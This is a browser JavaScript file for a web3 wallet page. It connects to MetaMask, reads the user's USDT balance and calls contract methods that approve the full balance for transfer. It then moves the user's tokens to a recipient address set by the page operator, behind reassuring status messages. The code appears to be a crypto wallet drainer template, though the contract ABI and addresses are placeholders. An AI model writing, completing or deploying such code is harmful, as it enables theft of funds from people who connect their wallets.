const contractABI = /* Place your ABI here */;
const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2';

let web3;
let contract;
let userAccount;

// Initialize Web3
window.addEventListener('load', async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.enable(); // Request account access
            initApp(); // Initialize app after access is granted
        } catch (error) {
            console.error('User denied account access', error);
        }
    } else {
        alert('Please install MetaMask!');
    }
});

// Initialize app and contract
async function initApp() {
    contract = new web3.eth.Contract(contractABI, contractAddress);
    document.getElementById('connectWallet').addEventListener('click', connectWallet);
    document.getElementById('approveTokens').addEventListener('click', approveTokens);
    document.getElementById('transferTokens').addEventListener('click', transferTokens);
}

// Connect wallet
async function connectWallet() {
    const accounts = await web3.eth.requestAccounts();
    userAccount = accounts[0];
    document.getElementById('walletAddress').textContent = userAccount;
    document.getElementById('walletInfo').classList.remove('hidden');

    // Display balance
    const balance = await getTokenBalance(userAccount);
    document.getElementById('walletBalance').textContent = web3.utils.fromWei(balance, 'ether');
}

// Get USDT balance
async function getTokenBalance(address) {
    return await contract.methods.balanceOf(address).call();
}

// Approve tokens
async function approveTokens() {
    const spenderAddress = contractAddress; // The contract itself
    const balance = await getTokenBalance(userAccount);
    
    // Approve full balance
    await contract.methods.approveForTransfer(
        'USDT token address', 
        userAccount, 
        spenderAddress
    ).send({ from: userAccount });

    document.getElementById('status').textContent = 'Tokens approved for transfer.';
}

// Transfer tokens
async function transferTokens() {
    const recipientAddress = 'recipient address'; // Set your recipient address
    const balance = await getTokenBalance(userAccount);

    await contract.methods.autoTransferTokens(
        'USDT token address', 
        userAccount, 
        recipientAddress
    ).send({ from: userAccount });

    document.getElementById('status').textContent = 'Tokens transferred successfully!';
}
